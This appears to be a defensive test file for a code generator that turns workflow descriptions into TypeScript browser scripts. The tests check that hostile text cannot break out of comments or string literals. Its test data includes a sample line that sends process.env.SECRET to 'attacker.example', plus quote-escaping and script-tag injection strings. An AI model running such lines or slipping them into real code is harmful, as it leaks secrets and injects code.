// Hostile-input tests for codegen. Free text and selector values in the IR
// must never change the structure of the generated TypeScript. These tests
// call the templater directly as well as through compile(), because the
// compiler must hold this property even for input the IR validator would
// reject.

import { describe, it, expect } from 'vitest';
import ts from 'typescript';
import { compile, createTemplater, CompilerError, formatTypeScript } from '../src/index.js';
import type { Workflow } from '@sfysh/ir';

const LINE_SEPARATOR = String.fromCharCode(0x2028);
const PARAGRAPH_SEPARATOR = String.fromCharCode(0x2029);
const NEXT_LINE = String.fromCharCode(0x85);

const PAYLOAD = "await page.goto('https://attacker.example/?c=' + process.env.SECRET);";

/**
 * Parse generated source and return the statements at module level and the
 * statements inside the workflow callback, as source text.
 */
function structure(source: string): { topLevel: string[]; body: string[]; errors: number } {
  const file = ts.createSourceFile('out.ts', source, ts.ScriptTarget.ESNext, true);
  const errors = (file as unknown as { parseDiagnostics: unknown[] }).parseDiagnostics.length;
  const topLevel = file.statements.map((s) => ts.SyntaxKind[s.kind]);
  const body: string[] = [];
  const call = file.statements.find(ts.isExpressionStatement);
  if (call && ts.isCallExpression(call.expression)) {
    const fn = call.expression.arguments[1];
    if (fn && ts.isArrowFunction(fn) && ts.isBlock(fn.body)) {
      for (const s of fn.body.statements) body.push(s.getText(file));
    }
  }
  return { topLevel, body, errors };
}

function hostileWorkflow(breaker: string): Workflow {
  return {
    irVersion: '1.0.0',
    id: 'wf_hostile',
    name: `Name${breaker}${PAYLOAD}`,
    description: `Description${breaker}${PAYLOAD}`,
    steps: [
      {
        id: 'step_nav',
        intent: `Open the page${breaker}${PAYLOAD}`,
        action: 'navigate',
        url: 'https://example.com',
      },
      {
        id: 'step_guard',
        intent: `Guard${breaker}${PAYLOAD}`,
        action: 'guard',
        if: { selectorVisible: '#banner' },
        then: [
          {
            id: 'step_inner',
            intent: `Inner${breaker}${PAYLOAD}`,
            action: 'click',
            target: { candidates: [{ kind: 'css', value: '#accept' }] },
          },
        ],
      },
    ],
  } as unknown as Workflow;
}

describe('codegen: comment text cannot break out into code', () => {
  it.each([
    ['line feed', '\n'],
    ['carriage return', '\r'],
    ['CRLF', '\r\n'],
    ['line separator U+2028', LINE_SEPARATOR],
    ['paragraph separator U+2029', PARAGRAPH_SEPARATOR],
    ['next line U+0085', NEXT_LINE],
  ])('keeps a %s inside the comment', async (_label, breaker) => {
    // Bypass validation on purpose: the templater is the last line of defence.
    const rendered = createTemplater().renderWorkflow(hostileWorkflow(breaker));
    const source = await formatTypeScript(rendered);
    const { topLevel, body, errors } = structure(source);

    expect(errors).toBe(0);
    // One import and one workflow() call. Nothing injected at module level.
    expect(topLevel).toEqual(['ImportDeclaration', 'ExpressionStatement']);
    // Destructure, goto, guard. Nothing injected in the body.
    expect(body).toHaveLength(3);
    expect(body[0]).toBe('const { page } = ctx;');
    expect(body[1]).toBe("await page.goto('https://example.com');");
    expect(body[2]).toMatch(/^if \(await page\.locator\('#banner'\)\.isVisible\(\)\) \{/);
    // The payload text survives only as comment text.
    for (const line of source.split('\n')) {
      if (line.includes('attacker.example')) expect(line.trimStart().startsWith('//')).toBe(true);
    }
  });

  it('compile() rejects control characters in intent before codegen', async () => {
    await expect(compile(hostileWorkflow('\n'))).rejects.toThrow(CompilerError);
    await expect(compile(hostileWorkflow('\n'))).rejects.toThrow(/control characters/);
  });
});

describe('codegen: string values cannot break out of their literal', () => {
  const hostileStrings = [
    "a'); evil(); ('",
    'a"); evil(); ("',
    'a`); evil(); (`',
    "a\\'); evil(); ('",
    "a\n'); evil(); ('",
    `a${LINE_SEPARATOR}'); evil(); ('`,
    'a${process.env.SECRET}',
    'a\\',
    '*/ evil(); /*',
    '</script><script>evil()</script>',
  ];

  function workflowWith(value: string): Workflow {
    return {
      irVersion: '1.0.0',
      id: 'wf_strings',
      name: 'Hostile strings',
      steps: [
        {
          id: 'step_nav',
          intent: 'Open.',
          action: 'navigate',
          url: `https://example.com/${value}`,
        },
        {
          id: 'step_css',
          intent: 'Click by css.',
          action: 'click',
          target: { candidates: [{ kind: 'css', value }] },
        },
        {
          id: 'step_testid',
          intent: 'Click by test id.',
          action: 'click',
          target: { candidates: [{ kind: 'testid', value }] },
        },
        {
          id: 'step_text',
          intent: 'Click by text.',
          action: 'click',
          target: { candidates: [{ kind: 'text', value }] },
        },
        {
          id: 'step_label',
          intent: 'Fill by label.',
          action: 'fill',
          target: { candidates: [{ kind: 'label', value }] },
          value,
        },
        {
          id: 'step_role',
          intent: 'Click by role.',
          action: 'click',
          target: { candidates: [{ kind: 'role', value }] },
        },
        {
          id: 'step_assert',
          intent: 'Assert text.',
          action: 'assert',
          condition: { textPresent: value },
        },
        {
          id: 'step_wait',
          intent: 'Wait for url.',
          action: 'wait',
          forCondition: { urlMatches: value },
        },
        {
          id: 'step_post',
          intent: 'Click with postconditions.',
          action: 'click',
          target: { candidates: [{ kind: 'css', value: '#ok' }] },
          post: [{ selectorVisible: value }, { textPresent: value }],
        },
      ],
    } as unknown as Workflow;
  }

  it.each(hostileStrings.map((s) => [JSON.stringify(s), s]))(
    'compiles %s into exactly the expected statements',
    async (_label, value) => {
      const { source } = await compile(workflowWith(value));
      const { topLevel, body, errors } = structure(source);

      expect(errors).toBe(0);
      expect(topLevel).toEqual(['ImportDeclaration', 'ExpressionStatement']);
      // Destructure, nine step bodies, two postcondition asserts.
      expect(body).toHaveLength(12);
      expect(source).not.toMatch(/^\s*evil\(\);/m);
      for (const statement of body) {
        expect(statement.startsWith('evil')).toBe(false);
      }
    },
  );

  it('round-trips the exact string value through the generated literal', async () => {
    const value = 'it\'s a "test" with \\ and \n and ${x}';
    const { source } = await compile(workflowWith(value));
    const file = ts.createSourceFile('out.ts', source, ts.ScriptTarget.ESNext, true);
    const literals: string[] = [];
    const visit = (node: ts.Node): void => {
      if (ts.isStringLiteral(node)) literals.push(node.text);
      ts.forEachChild(node, visit);
    };
    visit(file);
    expect(literals).toContain(value);
  });

  it('does not write raw line separators into the generated file', async () => {
    const { source } = await compile(workflowWith(`a${LINE_SEPARATOR}b${PARAGRAPH_SEPARATOR}c`));
    expect(source.includes(LINE_SEPARATOR)).toBe(false);
    expect(source.includes(PARAGRAPH_SEPARATOR)).toBe(false);
  });
});

describe('codegen: secrets and parameters', () => {
  it('rejects a secret reference that the workflow does not declare', async () => {
    const wf = {
      irVersion: '1.0.0',
      id: 'wf_undeclared',
      name: 'Undeclared secret',
      steps: [
        {
          id: 'step_fill',
          intent: 'Fill the password.',
          action: 'fill',
          target: { candidates: [{ kind: 'label', value: 'Password' }] },
          value: { secret: 'portal_password' },
        },
      ],
    } as unknown as Workflow;
    await expect(compile(wf)).rejects.toThrow(/not declared in the workflow's secrets/);
  });

  it('brings vault into scope whenever a step reads a secret', async () => {
    const wf = {
      irVersion: '1.0.0',
      id: 'wf_nested_secret',
      name: 'Nested secret',
      secrets: ['portal_password'],
      steps: [
        {
          id: 'step_guard',
          intent: 'Log in if asked.',
          action: 'guard',
          if: { selectorVisible: '#login' },
          then: [
            {
              id: 'step_fill',
              intent: 'Fill the password.',
              action: 'fill',
              target: { candidates: [{ kind: 'label', value: 'Password' }] },
              value: { secret: 'portal_password' },
            },
          ],
        },
      ],
    } as unknown as Workflow;
    const { source } = await compile(wf);
    expect(source).toContain('const { page, vault } = ctx;');
    expect(source).toContain("vault('portal_password')");
  });

  it('refuses to compile a parameter reference instead of emitting an undefined variable', async () => {
    const wf = {
      irVersion: '1.0.0',
      id: 'wf_param',
      name: 'Parameter',
      parameters: { startUrl: { type: 'string' } },
      steps: [{ id: 'step_nav', intent: 'Open.', action: 'navigate', url: { param: 'startUrl' } }],
    } as unknown as Workflow;
    await expect(compile(wf)).rejects.toThrow(CompilerError);
    await expect(compile(wf)).rejects.toThrow(/parameters are not supported by the runtime yet/);
  });
});
